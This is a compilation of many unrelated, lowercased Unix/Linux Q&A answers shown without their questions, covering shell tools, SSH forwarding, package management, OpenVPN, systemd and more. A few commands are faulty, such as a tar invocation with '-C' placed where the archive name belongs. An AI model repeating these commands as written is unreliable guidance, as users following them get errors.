well , you could do it with some command line tools . cdrecord ( wodim on debian ) can burn audio cds on the fly , but it needs an * . inf files that specify track sizes etc . you can generate an inf file upfront with a dummy cd that has ( say ) one large audio track ( 74 minutes ) using cdda2wav ( icedax on debian ) . in the live setting you record from an audio device of your choice with arecord in one xterm to a temporary file x . use as argument of --duration the track size in seconds . in another xterm you can start after a few seconds ( to allow some buffering ) cdrecord which reads the audio from a pipeline from x and uses the prepared inf file . you have to make sure that you specify speed=1 for writing . of course , you have to test this setup a bit ( first times with cdrecord -dummy ... ! ) and lookup the right options . but the manpage of cdrecord already contains an on the fly example as starting point : to copy an audio cd from a pipe ( without intermediate files ) , first run icedax dev=1,0 -vall cddb=0 -info-only  and then run icedax dev=1,0 -no-infofile -B -Oraw - | \ wodim dev=2,0 -v -dao -audio -useinfo -text *.inf  but after you have everything figured out , you can create a script that automates all these steps .
run udevadm info -a -n /dev/sda and parse the output . you will see lines like DRIVERS=="ahci"  for a sata disk using the ahci driver , or DRIVERS=="usb-storage"  for an usb-connected device . you will also be able to display vendor and model names for confirmation . also , ATTR{removable}=="1"  is present on removable devices . all of this information can also be obtained through /sys ( in fact , that is where udevadm goes to look ) , but the /sys interface changes from time to time , so parsing udevadm is more robust in the long term .
q#1 why does the name of the script not show up when called through env ? from the shebang wikipedia article : under unix-like operating systems , when a script with a shebang is run as a program , the program loader parses the rest of the script 's initial line as an interpreter directive ; the specified interpreter program is run instead , passing to it as an argument the path that was initially used when attempting to run the script . so this means that the name of the script is what is known by the kernel as the name of the process , but then immediately after it is invoked , the loader then execs the argument to #! and passes the rest of the script in as an argument . however env does not do this . when it is invoked , the kernel knows the name of the script and then executes env . env then searches the $PATH looking for the executable to exec . how does /usr/bin/env know which program to use ? it is then env that executes the interpreter . it knows nothing of the original name of the script , only the kernel knows this . at this point env is parsing the rest of the file and passing it to interpreter that it just invoked . q#2 does pgrep simply parse the output of ps ? yes , kind of . it is calling the same c libraries that ps is making use of . it is not simply a wrapper around ps . q#3 is there any way around this so that pgrep can show me scripts started via env ? i can see the name of the executable in the ps output . $ ps -eaf|grep 32405 saml 32405 24272 0 13:11 pts/27 00:00:00 bash ./foo.sh saml 32440 32405 0 13:11 pts/27 00:00:00 sleep 1  in which case you can use pgrep -f &lt;name&gt; to find the executable , since it will search the entire command line argument , not just the executable . $ pgrep -f foo 32405  references # ! /usr/bin/env interpreter arguments — portable scripts with arguments for the interpreter why is it better to use “# ! /usr/bin/env name” instead of “# ! /path/to/name” as my shebang ?
local port forwarding means forwarding a port on the ssh client machine through the ssh server machine , not onto it . the ip address you specify in the argument is any address/hostname reachable from you ssh server . thus if the wintendo box is behind the server you are able to ssh into , and reachable from it , you simply can do this on your client : $ ssh -L 7000:&lt;IP of Windows box&gt;:3389 &lt;SSH server&gt;  then you can connect to your client 's port 7000 and the connection is forwarded through your ssh server to the windows box 's port 3389 .
not really . unless you decide to forgo the check altogether if size+timestamp matches , there is little to optimize if the checksums actually match ; the files will all be identical but to verify that , you actually have to read all of it and that just takes time . you could reduce the number of md5sum calls to a single one by building a global md5sums file that contains all the files . however , since the bottleneck will be disk i/o there will be not much difference in speed . . . you can optimize a little if files are actually changed . if file sizes change , you could record file sizes too and not have to check the md5sum , because a different size will automatically mean a changed md5sum . rather than whole file checksums , you could do chunk based ones so you can stop checking for differences in a given file if there already is a change early on . so instead of reading the entire file you only have to read up until the first changed chunk .
i do not think so . the patch seems to provide real-time scheduling which is very important for some enviroments ( planes , nuclear reactors etc . ) but overkill for regular desktop . the current kernels however seems to be enough " real-time " and " preemptive " for regular desktop users [ 1 ] . it may be useful if you work with high quality audio recording and playing in which even small amount of time may dramatically reduce the quality . [ 1 ] technically both are 0/1 features but i guess it is clear what i mean ; )
you are c executable probably requires some environment variables to be set to function . for example the env . variable $PATH or $LD_LIBRARY_PATH . there also other variables such as $HOME which will not be set until a user has logged in . this last one might be necessary for your app to access config files and/or log files , for example .
why use grep , find can do the job : find /home/USER/logfilesError/ -maxdepth 1 -type f -name "xy_*" -daystart -mtime -1 
in most systems the physical address space is mapped to various " devices " - one of which is the system ram , another of which might be something like a pci bus . the bus address is the value actually placed on the address pins of the mapped bus , and is usually some range of bits taken from the physical address . other bus pins such as chip select and read/write etc may or may not be taken from the physical address . this is the " memory mapped " approach to interfacing to devices and buses , but it is not the only way - for example , intel processors have special i/o instructions to indicate that you are communicating with a device and the physical address plays no part in it . in this case , the bus address is encoded in the instruction or resides in a register . cheers ! murray . . .
there is probably a neater way , but you can do ls | grep -v '\ . c$' | xargs rm
if you want to periodically execute a specific command you can use watch ( 1 ) . per default the specified program is executed every two seconnds . to run date every second just run : watch -n 1 date 
good grief . i had this problem on one computer , finding that networkmanager had put 192.168.1.251 as a nameserver into /etc/resolv . conf even though my entire network is 192.168.0.0/24 . my guess had been that it had to do with the netgear wnc2001 wifi box i had plugged into the ethernet port of that linux box . but then today , while working on windows xp on a used t60p i just bought , i found that it had correctly gotten an ip address from my wireless router , but that it had set the dns server to 192.168.1.251 ! ! no wnc2001 on this box . seemed like a big coincidence that two totally different computers on my network would somehow incorrectly set their dns server to 192.168.1.251 ! i did a " ipconfig /renew " on the windows box and it correctly set the dns servers to those given to it by my router ( a d-link dir-628 ) . i decided to look up " dns 192.168.1.251" and found this site . this is the first site i checked out . i am very curious . will check a few other hits .
use ${VAR%PATTERN} to remove the suffix corresponding to the last field , then ${NEWVAR##PATTERN} to remove the prefix corresponding to all but the last remaining field . all_but_last_field=${mystring%.*} second_to_last_field=${all_but_last_field##*.}  you need to store the string in a variable and store the intermediate result in a variable as well , you can not directly chain the expansions ( you can in zsh , but not in bash ) .
they are daemons ( computing ) – as in " workers behind the curtain " . all depending on how you interpret the word they can definitively also be demons . as wikipedia and take our word for it explains ; the words is taken from maxwell 's daemon maxwell 's_demon . svg htkym cc , wikipedia – " an imaginary agent which helped sort molecules of different speeds and worked tirelessly in the background . " else the usage of the word is somewhat in these lines : daemon: spirit (polytheistic context) demon : evil spirit (monotheistic context)  fix#1: and as pointed out by the good mr . @michael kjörling , to emphasize : " of course , just because the executable 's name ends in d does not mean it is a daemon . " sed Stream Editor dd Data Description chmod Change file mode bits xxd Hex Dump find Find  etc . are examples of frequently used tools ending in d . then again that would not be an added suffix as in sedd . ls /usr/bin/*d /bin/*d  though ; typically daemons have the letter d appended at the end . telnet vs telnetd another writeup on the subject of *nix daemons .
i was able to reproduce the behaviour using zsh 4.3.10 (i686-pc-linux-gnu) . % cat &lt;(funjoin &lt;(cat demo) &lt;(cat demo)) | head -1 join: /proc/self/fd/11: No such file or directory  i dug into the manual and the closest i found to this problem was the chapter process substitution in man zshexpn and multios in man zshmisc . both chapters are suggesting a workaround involving putting curly braces around part of the command . i tried that % { cat &lt;(funjoin &lt;(cat demo) &lt;(cat demo)) } | head -1 1  and it works . i was not able to fully grok what the semantics of { } is in zsh . the manual explains it simply as a list of commands . i also do not fully understand what exactly this multios does . it seemed to make no difference whether it was enabled or disabled . i tried to place the curly braces in different places , including in the body of the function funjoin , but the only place where it works correctly is around the outer cat .
however , if i remove " ( subbotin@avs234 ) " the kernel compiles just fine . you do not need this in the localversion . " subbotin@avs234" is just the one that compiled the kernel ( user@host ) . it is not part of the version string nor needed for anything related to the compilation of the kernel .
the source for chessx appears to be a .tgz file , which is a compressed archive . move it to an empty directory and try tar -xzf chessx-1-0-0.tgz . this will probably unpack into a directory of its own . that is the top level directory from which you want to run qmake . that will build the project , but it may not install it into a default location . have a look inside the directory and see if there is an install or readme file . do i need to yum install qmake ? if you get " command not found " for qmake , yes . there may be other things you need to install ; i do not know how friendly qmake is at explaining what those are to you .
try the ps -C with just the bare script name ( i.e. . without ./ ) . e.g. ps -C code -o euser....
i contacted jamie zawinski , author of xscreensaver , to ask whether it can span one screen saver across multiple monitor , and he gave me this response : no , it does not do that by design because i have tried it and with 99% of the savers it looks like shit . for the ones where it does not look like shit , one saver mode looks the same . i guess he is referring to the bezel gap between monitors making the image look odd as it transitions between monitors .
it looks like redmine is requiring an exact version of mocha ( 0.12.3 ) . you have a more recent version . the solution is probably to uninstall your version , and install the version redmine is looking for : gem uninstall mocha --version 0.12.4 gem install mocha --version 0.12.3 
ok , i figured it out . i should have mentioned that i had a virtuozzo container for my vps . http://kb.parallels.com/en/746 mentions the following : also it might be required to increase numiptent barrier value to be able to add more iptables rules : ~# vzctl set 101 --save --numiptent 400 fyi : the container has to be restarted for this to take effect . this explains why i hit the limit at around 400 . if i had centos 6 , i would install the ipset module ( epel ) for iptables instead of adding all these rules ( because ipset is fast ) . as it stands now , on centos 5.9 , i would have to compile iptables > 1.4.4 and my kernel to get ipset . since this is a vps and my host may eventually upgrade to centos 6 , i am not going to pursue that .
only the first is enough . it will even have at least one complete desktop environment , gnome . the way the content is organised is such that the most popular packages ( according to popcon ) are in the earlier discs .
i normally use this style of command to run grep over a number of files : find / -xdev -type f -print0 | xargs -0 grep -H "800x600"  what this actually does is make a list of every file on the system , and then for each file , execute grep with the given arguments and the name of each file . the -xdev argument tells find that it must ignore other filesystems - this is good for avoiding special filesystems such as /proc . however it will also ignore normal filesystems too - so if , for example , your /home folder is on a different partition , it will not be searched - you would need to say find / /home -xdev ... . -type f means search for files only , so directories , devices and other special files are ignored ( it will still recurse into directories and execute grep on the files within - it just will not execute grep on the directory itself , which would not work anyway ) . and the -H option to grep tells it to always print the filename in its output . find accepts all sorts of options to filter the list of files . for example , -name '*.txt' processes only files ending in . txt . -size -2M means files that are smaller than 2 megabytes . -mtime -5 means files modified in the last five days . join these together with -a for and and -o for or , and use '' parentheses '' to group expressions ( in quotes to prevent the shell from interpreting them ) . so for example : find / -xdev '(' -type f -a -name '*.txt' -a -size -2M -a -mtime -5 ')' -print0 | xargs -0 grep -H "800x600"  take a look at man find to see the full list of possible filters .
( rewritten after comments showed this question and my answer were not moving anywhere productive . it is got a new tone and covers the ground a bit differently ) . to answer the new question : each distribution does what they feel is best for their users . this usually consists of a ) some level of customization to fit their particular philosophy and b ) some level of standardization for comparability with other distros . the most important standardizing factor is the fhs / filesystem hierarchy standard which tries to keep a clear and consise definition for all the major directories found on unix systems today . the standard is evolving to accommodate the needs of modern distros but moves slowly so as not to break old ones . most distros do not wander too far from fhs . read it . it will help you make sense of all unices . while not every directory might be used in a default install , most of them are . the hierarchy is not " full of unused " directories , and even the few that start out empty are there because they will potentially be used . for example , since binaries from distro packages are all installed in /usr/bin and /usr/local/bin is for custom additions of your own , the later folder will start out empty on any clean installation . however , it still exists for a purpose . to answer to original question : the original question began with a comparison about the " organized " windows directory layout and the " confusing " unix layout . i do not think that is a fair comparison , here is why . any comparisons between systems needs to take into account the scope of the things being compared . you can compare and apple to an orange and produce* a useful list of differences . some people will prefer one over the other . what you cannot easily do is compare an apple to an oil refinery . that is intentionally a dramatic statement , but i hope it helps you to understand the scenario at hand . the unix file system does more than the windows file system does . it is therefore more complex . if you want to compare them , you should take into account all the systems in windows play the same roles covered by just the file system in unix . for example the things the windows registry does are mostly rolled into the unix file system . in unix , devices like your hard drives and mice are also file nodes and can be manipulated as such . even meta data about running processes and kernel level options like networking parameters can be read and written to through the file system . on windows these require special apis and complex programs . in unix it is as simple as reading or writing a text file . this explains things like the /proc , /sys , /dev , and /run directory structures which do not appear to have counterparts in windows . additionally , in spite of the extra function , it probably is not as " dirty " as you might first assume . there are historical reasons for some decisions , but they continue to exist because they continue to be used . i am not aware of folders that are routinely empty . the user-facing guis in linux operation almost entirely in realm of the $HOME directory . everything is in /home/username or your distro 's equivalent . inside that space , there is a trend towards verbose names with capitals such as " downloads " and " pictures " rather than " incoming " and " pics " . anyone simply using a linux computer through a modern gui is unlikely to need to know about anything other than these familiarly named folders in their home directory . anything outside the home directory is the realm of system administrators . only when you want to modify or extend a linux system do you need to learn about the rest of the directory structure . if you plan on writing software , or tinkering with existing bits , it is worthwhile to learn the current conventions as detailed in the fhs specifications which are generally adhered to by most distros . also of note when coming from a windows background is that , in general , distributions rather than individual software packages make the decisions about where things go . they are generally very similar , but each distro will have an overall unifying philosophy of where things should be kept . in windows software , the software authors place their stuff wherever they want and distribute it with an installer that places it there . usually everything ends up in some tree of their own design under a couple folders with their program 's name . in the linux world , software is usually distributed in packages maintained by the makers of the distro . upstream software is split up , wrapped and generally made to conform to the distro 's preferences . this usually results in a much more organized overall system . you do not need to re-learn anything with each new package you install , the important thing is that you already know the ropes of your distro and everything will be consistently found in the same places . when looking for the executables for package a , b and c , where a is from part of the windows core but b and c are from different vendors . in windows it might be : c:\Windows\System32\programA.exe c:\Program Files\Vendor A - Program A\packageA\program\A.exe c:\Program Files\programB\bin\program.exe  . . . but it could be several other variants depending on the vendor 's habits . let 's say in linux you installed package b through the package repositories and c by downloading a source package and manually installing it . the binaries will predictably end up in : /usr/A /usr/bin/B /usr/local/bin/C  if you still feel the system needs " fixing " it might be worth considering the comments on this question . it is possible to " re-organize " the current layout , but any attempt to do so will quickly run afoul of what many consider very finely tuned machinery . * pun intended .
1 . there is no need to define directory trees individually : bad way : ~ $ mkdir tmp ~ $ cd tmp ~/tmp $ mkdir a ~/tmp $ cd a ~/tmp/a $ mkdir b ~/tmp/a $ cd b ~/tmp/a/b/ $ mkdir c ~/tmp/a/b/ $ cd c ~/tmp/a/b/c $  good way : ~ $ mkdir -p tmp/a/b/c  2 . archiving : sometimes i have seen people move any tar like a . tar to another directory which happens to be the directory where they want to extract the archive . but that is not needed , as the -c option can be used here to specify the directory for this purpose . ~ $ tar xvf -C tmp/a/b/c newarc.tar.gz  3 . importance of control operators : suppose there are two commands , but only if the first command runs , then the second one must run , otherwise the second command would have run for nothing . so , here a command must be run , only if the other command returns a zero exit status . example : ~ $ cd tmp/a/b/c &amp;&amp; tar xvf ~/archive.tar  in the above example , the contents of the archive need to be extracted in the directory : c , but only if the directory exists . if the directory does not exist , the tar command does not run , so nothing is extracted .
i switched to firefox for a while , but few weeks ago i tried chrome once again . it was a big surprise to me ; it works ! seems that system upgrade had fixed the bug in some point . i am using google chrome 24.0.1284.2 dev from aur now .
what you want is a multiseat xxorg configuration . i do not know which distro you are using , so i will just link to the xorg wiki entry . x is well suited for this , since 20+ years ago many institutions did this with all of their unix machines . you will not be able to use the same keyboard and mouse for both displays , though .
since i use centos , which is a rhel variant , the rpm command will need to be executed in terminal to accomplish this ( i believe so ) while rpm is used to work with the actual packages , rhel and friends now use yum to make it less tedious . yum lets you install software through repositories , local or remote collections of rpm packages and index files , and handles dependency resolution and the actual fetching and install of the files for you . you can find the list of repositories configured on your machine by peeking in the /etc/yum.repos.d/ directory . however , to use the wget command to download the package , i will need a url that points to the package . how should i find this url ? by finding the appropriate .rpm file and downloading it ? or perhaps i do not understand what your question is . regardless , if you are grabbing rpm files from somewhere on the internet , they are probably going to also have a yum repo set up , in which case it would be far more prudent to actually install their repo package first . hilariously , you do this by downloading and installing an rpm file . my personal research has shown that there are sites like rpm . pbone .net( the only one i know off ) to search for these packages while that site lets you search many known rpm packages , and you might find some handy bits and pieces there , i would not try using it for things you care deeply about . epel is a handy repository . you can also take a peek at atrpms and rpmforge , though use them with caution . they are sometimes known to offer package replacements that may end up causing the worst sort of dependency hell ever experienced . it took me a few weeks to sort out a mess that someone made with clamav . if you use either of those repositories , please consider setting their " enabled " flag to 0 in their config files in /etc/yum.repos.d/ and using the --enablerepo=... command line switch to yum . given that version 5.0.2 is available for fedora ( another rhel variant ) , where is the latest version of firefox for centos ? there are two bad assumptions here . first , you have the fedora/rhel relationship reversed . rhel is generally based on fedora , not the other way around . rhel 5 is similar to fedora 6 . any packages built for fedora 6 have a high chance of operating on rhel 5 . however , fedora is bleeding edge , and releases have a 12-month lifespan . nobody is building packages for fedora 6 any longer , it went end of life back in 2007ish . second , if you are trying to use centos 5 as a desktop os in this day and age , you are insane . it is prehistoric . in fact , for a while modern firefox versions would not even run on centos 5 because of an outdated library . that is now resolved . mozilla provides official ( non-rpm ) builds suitable for local installation and execution that you can use instead . just head over to http://getfirefox.com/ for the download . centos , being based on rhel , inherits rhel 's packaging policy . rhel never moves to newer non-bugfix versions of anything , as their goal is general stability . for example , centos 5 will be stuck with php 5.1 , postgresql 8.1 , perl 5.8 and python 2.4 forever . rhel sometimes provides newly named packages with newer versions , like python26 and php53 so that system administrators that expressly want new versions can kind of have access to them . i am unsure which package should i download to upgrade firefox . you almost certainly will not find such a package . if you want ff5 on centos 5 , you should probably do a local installation of the official binaries from mozilla . i am currently , just for practice , searching for the mozilla firefox and vlc 's latest releases . atrpms currently seems to offer vlc . ( i would not recommend simply grabbing the rpm from that page and installing it , but using yum to install it from the atrpms repo . ) the official vlc rhel download page recommends rpmforge instead , though they are shipping an older version there . yes , that means that both of them offer vlc . remember how i recommended setting enabled to 0 ? yeah , this is why . i want to take a moment to re-emphasize that you should not try using centos 5 as a desktop os right now . red hat 's update policies indicate that rhel 5 will stop getting non-bugfix updates at the end of the year , and stop getting anything but security and critical bug fixes at the end of next year . it would basically be like installing xp on a new machine . rhel 6 has been out for a while . the centos folks had to completely redo their build environment in order to accommodate it . apparently the centos 6 images are being distributed to mirrors now , or so their qa calendar suggests . we will see . regardless , it would be a slightly better idea for a new installation today , if you expect the machine to have a long life in production . on the other hand , if you are seriously looking at linux on the desktop , consider a distribution that keeps itself up to date with modern software , like fedora itself or even something debian-based like ubuntu . ubuntu has a lot of mindshare in desktop installs , and it seems like apt repositories ( apt is their yum-like tool ) are far , far more easily found than yum repositories .
while bash sets $! for that background job started with exec 3&gt; &gt;(job) , you can not wait for it or do any other things you had be able to do with job &amp; ( like fg , bg or refer it by job number ) . ksh93 ( where bash got that feature from ) or zsh do not even set $! there . you could do it the standard and portable way instead : in zsh ( and it is explicitly documented ) zmodload zsh/system { do-something-interesting } 3&gt; &gt;(sleep 1; echo $sysparams[pid]: here) echo $sysparams[pid]: there  would also work , but not in ksh93 or bash .
i have never seen anything like what you are asking for , but if i understand your question correctly you want to do what chris down said in his comment . use different ports for different hosts , e.g. port 22 for your server and port 222 for your router . you could then log in like this on the server : ssh steve@url , and like this on the router : ssh -p 222 router@url . openssh client has a configuration file that allows you to define aliases . these are handy if you ssh back and forth a lot . here are two minimal examples ( remeber to substitute " url " for your real url ) : # ~/.ssh/config Host server User steve HostName url Port 22 Host router User router HostName url Port 222  you can now ssh to your server with ssh server and to your router with ssh router . if you still insist on making this work on only one port i recommend that you simply ssh into your server and then ssh from the server to the router ( or the other way around ) . alternatively you can create a user named router on your server and create a login script that automatically logs on to the router . depending on your login shell ( and the rest of your software , you said nothing about your system ) your could do something like this : i should mention that ( in my opinion ) this is an ugly solution to this problem .
sort on the appropriate field ( by default defined as whitespace to non-whitespace transition ) , in my case it is the 3rd one : ps aux | sort -n -k 3 
afaik , the only way to " catch " a signal like this is to use the trap command . which you specifically setup an action ( function or command ( s ) ) to run when a particular signal is received . example #!/bin/bash cleanup () { ...do cleanup tasks &amp; exit... } trap "cleanup" SIGPIPE ### MAIN part of script  this approach could just as easily be in a single one-liner vs . a script . the " function " that is called , cleanup , when SIGPIPE is seen could just as easily be a elaborate one-liner too . $ trap "cmd1; cmd2; cmd3;" SIGPIPE  if you look back at the original question you linked to : terminating an infinite loop , you will notice that this approach is even represented there as well .
sudo lpoptions -d sets the system-wide default printer ( by editing /etc/cups/lpoptions ) . you may also have a per-user default printer , which overrides the system-level setting . the per-user default is stored in ~/.cups/lpoptions ; you can change it with lpoptions -d .
no , this is not a bad idea . many devices that you may find around are running linux without swap partition . for example , there are many dlink router models with linux inside . the only possible issue is that it may run out of memory . however , with embedded solutions this should not happen if the system is properly designed ( no memory leaks , e.t.c. ) and user is not allowed to start any extra programs on his own .
in short , you want something like xrandr --output LVDS --scale 1.28x1.28  ( replacing LVDS with the desired output name , as seen in the output of running xrandr by itself ) . give it a try . some sites said that this does not work on some systems that are using kms ( kernel mode setting ) ; if so , that is a bug that is hopefully fixed . see these links for some more info on using xrandr to scale a screen like this : increase ( scale ) lcd resolution under ubuntu having a bigger resolution than the native one ? fun with xrandr and tiny netbook screens : )
with the backticks around the commands , you are attempting to execute the output of : echo "flush_all" | /usr/bin/nc 172.16.198.130 11211 in your case " ok " like already mentioned in the comments just remove the backticks .
if you are using bash then the history is kept in the file , .bash_history , in your home directory . this file can be copied from one system to another , it is just a text file . example $ tail -4 ~/.bash_history #1385239516 alias|grep cdc #1385240451 exit  the file is filled with lines that include a timestamp followed by the command that ran at that timestamp .
you do not specifically say which clustering software you are using , but based on the fact you are asking about qsub , i know that both gridengine ( and derivatives ) along with pbs use that particular command , so let 's start with those . i am most familiar with gridengine ( and derivatives ) so to submit a command using that package you had do something like this . example here 's a sample script , we will call it sample.bash . #!/bin/bash echo "Working directory is $PWD"  to submit this script , you do the following : $ qsub sample.bash  to target specific nodes within the cluster you will need to include attributes that are unique to a set of these nodes , so that the gridengine scheduling software can pick one of these nodes , and run your job on one of them .
i would think that this warning is harmless ( assuming you have not been hacked or you have not installed any suspicious packages ) , it seems that rkhunter thinks that scripts in /sbin are suspicious behaviour . in fact , checked on a clean ubuntu install i have here and chkconfig is indeed a script .
you are running into an output buffering problem . sed normally buffers its output when not writing to a terminal , so nothing gets written to the file until the buffer fills up ( probably every 4k bytes ) . use the -u option to sed to unbuffer output . clock -sf 'S%A, %B %d. %I:%M %P' | sed -u 's/\b0\+\([0-9]\+\)/\1/g' &gt; testfile 
first of all : you will not be able to route traffic to 127 . x.y. z anywhere other than the local machine ( ok , it might even be possible , but you had certainly break something else in the process . . . ) so i would recommend updating the apache config to also listen at the vpn ip ( e . g . 10.8.0.1 ) . if that is not an option , you could try one of the options at the end of my answer . openvpn clients should already get a route to the server , in my example sth . like this : if you want additional routes pushed to the clients , use : push "route 192.168.10.0 255.255.255.0"  ( change the ip/netmask accordingly ) . if you want your apache instance to be accessible by hostname ( and not just at http://10.8.0.1/ ) , put this in every client 's /etc/hosts file 10.8.0.1 servername.domain.example  or set up a dns server ( like dnsmasq &lt ; - make sure you disable the dhcp server ) and push it to the clients ( in your ovpn-conf ) : push "dhcp-option DNS 10.8.0.1"  that should do the trick . other options if you are unable to change the ips apache is listening at , the following approaches come to my mind ( but only use them as last resort ) : ssh port forwarding : instead of using openvpn ( or any other vpn server ) , connect to your server using ssh : ssh -L1234:localhost:80 user@servername  that way the apache instance on the server ( listening only at 127.0.0.1:80 ) will be available at your client at http://localhost:1234/ . you had have to do this on every client , therefore it is probably not suitable if you have got many of them . but even then you could set up a dedicated ssh user without shell access and a public key for each client in ~/.ssh/authorized_keys . keep in mind that the clients may be able to use this as a proxy to the internet or do some other stuff you might not want them to . so it is important to configure sshd correctly . some iptables magic ( you had have to nat the traffic ) some other user space port forwarding or a reverse proxy
i would use damn small linux , puppy linux , or similar . i would avoid any of the more general-purpose distros like arch or gentoo , purely because they are bigger . basically , you want the sort of distro that purposely does not include many packages , so you are forced on an individual basis to compile and install anything not essential to the core os 's operation . that will help you keep control of the os footprint , both in terms of ram and disk . yes , both of my recommended choices include a gui option . i think you should not use that as an immediate disqualifier , because with linux , the gui is always optional . if the installer does not give the option of disabling it , it is trivial to disable it after install : change the initdefault line in /etc/inittab to have a 2 or 3 in the second field . ( the behavior difference between runlevel 2 and 3 varies depending on the linux distro . typically you get a gui on boot only at level 5 . ) i am also aware that the specs for these systems recommend a 486+ or more ram . you can ignore this by choosing not to use all of the features available in the distro . you have already made a big leap in this direction by opting out of a gui . another big step is starting with a parsimonious distro in the first place .
i am really not quite sure why you are getting this error . i have a system with sudo 1.8.3 on it , and the documentation clearly says something like sudo -s "echo hi" should work , but it does not . the way i have always done this is to do the same thing -s [command] does , but manually . sudo sh -c 'echo hi'  or in your case sudo -u db2inst1 sh -c "/opt/ibm/db2/current/bin/db2 connect to PLC; /opt/ibm/db2/current/bin/db2 \"update EDU.contact set MOBILE_PHONE = '123'\""  its more compatible as the -s argument has not always been around ( and i unfortunately have some really old machines at work ) . edit : what is happening in the error you are getting is that it is looking for an executable which is literally named db2 "update EDU.contact set MOBILE_PHONE = '123'" in a directory called /opt/ibm/db2/current/bin/db2 connect to PLC; /opt/ibm/db2/current/bin ( yes , it looks for db2 connect to PLC; as a directory ) . this obviously doesnt exist .
i would be surprised if you had find every version as a . deb and . rpm on a single site . you will be lucky if you find every version of the . rpms . i would be very surprised . you can reach back to fedora core 1 ( fc1 ) through fc6 here on the fedora project archive . fedora 7 through 18 ( plus the latest ) are available on the same site in a different directory here . the . deb files are available through the debian distributions archive you can search through the archive here .
from what i see , the only ways would be to either do what you describe , check each of the permissions sets against the effective user/group . or you could try to set up sudo to be able to take test(1) . sudo -u luser test -x ~juser/bin/myprogram  like you said , check the effective user/groups permissions : on my ubuntu 11.04 system , running this script takes about 16ms , on average . also , stat does not need read/execute per
how about this trick ? find . -maxdepth 1 -exec echo \; | wc -l  as portable as find and wc .
having reviewed a version of the source code that matches the version number in your screenshot , i believe this will work : theharvester \u2013d syngress.com \u2013l 10 \u2013b google correction : theharvester \u2013d syngress.com \u2013b google the op 's version had no -l flag . the original command you tried to run was prefixed with ./ and suffixed with .py , which means : look for theharvester.py in the current directory and execute it . based on your locate , the binary is actually named theharvester and is located in /usr/bin/ . so , as @tnw pointed out , the script was renamed and installed into /usr/bin/ instead of wherever the book 's author assumed your current working directory was . because /usr/bin/ is almost certainly in your binary lookup $PATH , the ./ is not appropriate . also important is the space between -d and syngress.com due to the way the script is parsing arguments . it looks like the space was present in the original command you tried , but not in some of the other commenters ' suggestions .
i had this , it was an stty in . kshrc . remember that . kshrc is sourced on all ksh scripts , interactive and non interactive . if you run a script , stty will still fire , try to work on stdin , which is a file ( not a tty now ) and fail with an error .
install will do this , if given the source file /dev/null . the -D argument says to create all the parent directories : anthony@Zia:~$ install -D /dev/null /tmp/a/b/c anthony@Zia:~$ ls -l /tmp/a/b/c -rwxr-xr-x 1 anthony anthony 0 Jan 30 10:31 /tmp/a/b/c  not sure if that is a bug or not—its behavior with device files is not mentioned in the manpage . you could also just give it a blank file ( newly created with mktemp , for example ) as the source .
because amd was the first one to release 64-bit x86 ( x86-64 ) cpus . the amd64 architecture was positioned by amd from the beginning as an evolutionary way to add 64-bit computing capabilities to the existing x86 architecture , as opposed to intel 's approach of creating an entirely new 64-bit architecture with ia-64 . the first amd64-based processor , the opteron , was released in april 2003 . in fact , in the kernel the 64-bit support is called ' x86_64' to refer to the fact that both amd and intel ( and others ) implement those instructions .
i would google their part number ( see the content of /sys/class/block/sd&lt;x&gt;/device/model ) next to SLC or MLC , as i do not think that kind of information is exposed to the operating system and thus may not be queried automatically .
there are two ways to resolve this issue : move to a static ip address and related configuration for the server completely outside of the dhcp server 's domains ( you will have to configure the ip address , netmask , dns server ( s ) , etc . , on the host in question ) , or tell the dhcp server to always assign the same ip address for this particular interface . most dhcp server implementations support assigning a host ( actually a network interface ) a specific ip address , which will be handed out whenever that nic requests an ip address without increasing the risk of collisions ( since it is still the dhcp server handling the assignment ) . this is the route i would suggest that you take . however , exactly how to do that depends on which dhcp server you are using .
i have found this github-repo and now it works :- ) https://github.com/masterkorp/openvpn-update-resolv-conf when i add this to my openvpn-client config # This updates the resolvconf with dns settings script-security 2 up /etc/openvpn/update-resolv-conf.sh down /etc/openvpn/update-resolv-conf.sh 
if you are using systemd you should be able to set it up as a service . i found this thread which shows a similar task of setting up x11vnc as a systemd service . the thread is titled : index» newbie corner» how to enable x11vnc at startup using systemd ? . from a comment in that thread create the file : /etc/systemd/system/x11vnc.service create the file : /etc/systemd/system/graphical.target enable systemd service $ sudo systemctl enable graphical.target  this should create a link like this : /etc/systemd/system/default . target -> /etc/systemd/system/graphical . target reboot
no , you can not perform system calls directly because the shell running under terminal does not give you low level access to memory that you would need to call system calls and deal with the results . the shell 's job is to make it easy for you to run whole programs . some of these programs give you a more convenient interface to system calls and other operating system resources . for example , the mv command gives you a pleasant interface to the rename system call . the ln command gives you an interface to the link and symlink system calls . the built-in shell command cd gives you convenient access to chdir . but for the most part system calls provide services too basic to be useful for the shell to provide direct access to them .
it is all done with mime types in various databases . xdg-mime can be used to query and set user values .
i found the answer myself : i have to use the -A action option : compgen -o filenames -A file ... complete -o filenames -A file 
moreutils includes ts which does this quite nicely : command | ts '[%Y-%m-%d %H:%M:%S]' it eliminates the need for a loop too , every line of output will have a timestamp put on it . $ echo -e "foo\\nbar\\nbaz" | ts '[%Y-%m-%d %H:%M:%S]' [2011-12-13 22:07:03] foo [2011-12-13 22:07:03] bar [2011-12-13 22:07:03] baz  you want to know when that server came back up you restarted ? just run ping | ts , problem solved :d .
os x 10.8 is also listed as a unix 03 registered product in http://www.opengroup.org/openbrand/register/ . if you are using bash , it is not posix-compliant by default . echo does not support any options by default in sh though . os x 's sh is a version of bash with differences like : posix mode is enabled xpg_echo is enabled ( echo does not support any options and interprets escape sequences ) sh -l does not read . bash_profile fcedit defaults to ed instead of editor or ed
the issue was solved by installing an rt2800usb driver . now monitor mode can be enabled , though sometimes the connection is lost .
this can be done from find directly using -exec: find . -name "*.xml" -type f -exec xmllint --output '{}' --format '{}' \;  whats passed to -exec will be invoked once per file found with the template parameters {} being replaced with the current file name . the \; on the end of the find command just terminates the line . the use of xargs is not really necessary in this case because we need to invoke xmllint once per file as both the input and output file names must be specified within the same call . xargs would be needed if the command being piped to from find was working on multiple files at a time and that list was long . you cant do that in this case as you need to pass the single filename to the --output option of xmllint . without xargs you could end up with a " argument list to long " error if you are processing a lot of files . xargs also supports file replace strings with the -I option : find . -name "*.xml" -type f | xargs -I'{}' xmllint --output '{}' --format '{}'  would do the same as the find -exec command above . if any of your folders have odd chars in like spaces you will need to use the -0 options of find and xargs . but using xargs with -I implies the option -L 1 which means only process 1 file at a time anyway , so you may as well directly use find with -exec .
